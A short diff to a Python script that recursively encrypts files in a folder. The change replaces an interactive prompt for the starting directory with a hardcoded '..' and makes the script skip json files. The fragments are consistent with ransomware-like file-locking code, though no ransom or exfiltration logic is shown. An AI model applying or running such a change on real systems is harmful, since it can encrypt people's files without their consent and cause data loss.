@@ -1,7 +1,7 @@
 from base64 import b64encode, b64decode
 import encryption, constants, os, json, cryptools, sys
 
-target_folder = input('[*] Input Path To Root Directory To Start Encrypting: ')
+target_folder = '..'
 
 def main():
 
@@ -30,7 +30,7 @@ def EncryptFolder(folder_path):
 
 		for file in sub_files:
 
-			if len(file.split('.')) == 0:
+			if len(file.split('.')) == 0 or file.endswith('json'):
 				continue
 
 			json_dict = dict()
